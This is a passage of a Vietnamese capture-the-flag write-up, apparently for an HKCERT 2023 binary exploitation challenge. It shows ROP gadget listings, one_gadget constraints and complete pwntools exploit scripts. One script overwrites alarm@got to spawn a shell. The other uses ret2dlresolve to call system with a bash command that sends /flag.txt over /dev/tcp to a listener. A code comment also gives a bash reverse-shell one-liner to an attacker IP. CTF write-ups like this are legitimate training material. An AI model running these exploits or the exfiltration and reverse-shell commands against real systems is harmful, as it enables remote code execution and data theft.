0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ce : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401258 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040110a : add dil, dil ; loopne 0x401175 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2f0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401201 : call qword ptr [rax + 0xff3c35d]
0x0000000000401235 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401193 : cli ; jmp 0x401120
0x00000000004010e3 : cli ; ret
0x00000000004012db : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401190 : endbr64 ; jmp 0x401120
0x00000000004010e0 : endbr64 ; ret
0x00000000004012ac : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010de : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401105 : je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401147 : je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x000000000040100b : jmp 0x4840103f
0x000000000040110c : jmp rax
0x0000000000401237 : leave ; ret
0x000000000040110d : loopne 0x401175 ; nop ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret
0x0000000000401255 : mov eax, 0 ; pop rbp ; ret
0x0000000000401107 : mov edi, 0x404048 ; jmp rax
0x00000000004010df : nop ; endbr64 ; ret
0x0000000000401236 : nop ; leave ; ret
0x0000000000401202 : nop ; pop rbp ; ret
0x000000000040110f : nop ; ret
0x000000000040118c : nop dword ptr [rax] ; endbr64 ; jmp 0x401120
0x0000000000401106 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x0000000000401178 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012c0 : pop r14 ; pop r15 ; ret
0x00000000004012c2 : pop r15 ; ret
0x00000000004012bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012bf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040117d : pop rbp ; ret
0x00000000004012c3 : pop rdi ; ret
0x00000000004012c1 : pop rsi ; pop r15 ; ret
0x00000000004012bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x00000000004011a1 : retf
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004012dd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004012dc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401103 : test eax, eax ; je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401145 : test eax, eax ; je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 67
```

- onegadget : 

```cs
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

- libc_csu_init : 

```cs
<__libc_csu_init>:
0x00000000004012a0 <+64>:    mov    rdx,r14
0x00000000004012a3 <+67>:    mov    rsi,r13
0x00000000004012a6 <+70>:    mov    edi,r12d
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004012ad <+77>:    add    rbx,0x1
0x00000000004012b1 <+81>:    cmp    rbp,rbx
0x00000000004012b4 <+84>:    jne    0x4012a0 <__libc_csu_init+64>
0x00000000004012b6 <+86>:    add    rsp,0x8
0x00000000004012ba <+90>:    pop    rbx
0x00000000004012bb <+91>:    pop    rbp
0x00000000004012bc <+92>:    pop    r12
0x00000000004012be <+94>:    pop    r13
0x00000000004012c0 <+96>:    pop    r14
0x00000000004012c2 <+98>:    pop    r15
0x00000000004012c4 <+100>:   ret
........................
........................
```

- ở đây ta cần setup one_gadget để nó có thể thực thi , ta sẽ chọn og này : 

ta sẽ setup cho **r13** và **r14** thành NULL và nó sẽ được mov vào **rsi** và **rdx**

```cs
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

-  và ta cũng sẽ cần lệnh call đến got mà ta đã setup , ta sẽ đặt **rbx** thành 0 cho dễ tính toán 

```cs
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
```

- ta sẽ setup change libc@got -> one_gadget như sau : 

```cs 
og = 0xebd38

gadget = 0x40117C #  add dword ptr [rbp - 0x3d], ebx ; nop ; ret

rbx = (og - libc.sym.alarm)
"""
0x00000000004012a0 <+64>:    mov    rdx,r14
0x00000000004012a3 <+67>:    mov    rsi,r13
0x00000000004012a6 <+70>:    mov    edi,r12d
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004012ad <+77>:    add    rbx,0x1
0x00000000004012b1 <+81>:    cmp    rbp,rbx
0x00000000004012b4 <+84>:    jne    0x4012a0 <__libc_csu_init+64>
0x00000000004012b6 <+86>:    add    rsp,0x8
0x00000000004012ba <+90>:    pop    rbx
0x00000000004012bb <+91>:    pop    rbp
0x00000000004012bc <+92>:    pop    r12
0x00000000004012be <+94>:    pop    r13
0x00000000004012c0 <+96>:    pop    r14
0x00000000004012c2 <+98>:    pop    r15
0x00000000004012c4 <+100>:   ret
"""
rop_chain_pop = 0x00000000004012ba
rop_chain_mov = 0x00000000004012a0

payload = b'a'*120
# control rbp and rbx to add got -> execve
payload += p64(rop_chain_pop) + p64(rbx) + p64(exe.got.alarm+0x3d) + p64(0)*4 + p64(gadget) + p64(exe.sym.vuln)
```

- ta thấy lúc này libc@got của alarm đã thay đổi thành one_gadget 

![hehe](/assets/images/og.png)

- bây giờ cuối cùng ta sẽ setup cho **og** và call đến alarm@got , chú ý là cần thêm **address rbp-0x48 is writable** nên ta setup nó là **bss**

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
#gdb.attach(p,gdbscript='''
 #          b*0000000000401238
 #          ''')

og = 0xebd38

gadget = 0x40117C #  add dword ptr [rbp - 0x3d], ebx ; nop ; ret

rbx = (og - libc.sym.alarm)
"""
0x00000000004012a0 <+64>:    mov    rdx,r14
0x00000000004012a3 <+67>:    mov    rsi,r13
0x00000000004012a6 <+70>:    mov    edi,r12d
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004012ad <+77>:    add    rbx,0x1
0x00000000004012b1 <+81>:    cmp    rbp,rbx
0x00000000004012b4 <+84>:    jne    0x4012a0 <__libc_csu_init+64>
0x00000000004012b6 <+86>:    add    rsp,0x8
0x00000000004012ba <+90>:    pop    rbx
0x00000000004012bb <+91>:    pop    rbp
0x00000000004012bc <+92>:    pop    r12
0x00000000004012be <+94>:    pop    r13
0x00000000004012c0 <+96>:    pop    r14
0x00000000004012c2 <+98>:    pop    r15
0x00000000004012c4 <+100>:   ret
"""
rop_chain_pop = 0x00000000004012ba
rop_chain_mov = 0x00000000004012a0

payload = b'a'*120
# control rbp and rbx to add got -> execve
payload += p64(rop_chain_pop) + p64(rbx) + p64(exe.got.alarm+0x3d) + p64(0)*4 + p64(gadget) + p64(exe.sym.vuln)

p.sendline(payload)


payload2 =  b'a'*120 + p64(rop_chain_pop) + p64(0) + p64(0x405000-0x200) + p64(0)*3 + p64(exe.got.alarm) + p64(rop_chain_mov)

input()
p.sendline(payload2)
# after getting shell on remote server run the following
# bash -c 'sh -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'
p.interactive()
```

![og](/assets/images/one_gg.png)



- khai thác dự định : 

```python
from pwn import *

context.binary = elf = ELF('./chall')

# host a server listen to the flag
listener_ip = ''
listener_port = 4444

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=[f"bash -c 'cat /flag.txt >& /dev/tcp/{listener_ip}/{listener_port}'"])
rop.raw(rop.ret)
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p = remote('chal.hkcert23.pwnable.hk', 28333)

p.sendline(fit({120: raw_rop}))
sleep(1)
p.sendline(dlresolve.payload)

p.interactive()

```

![here](/assets/images/flag1.png)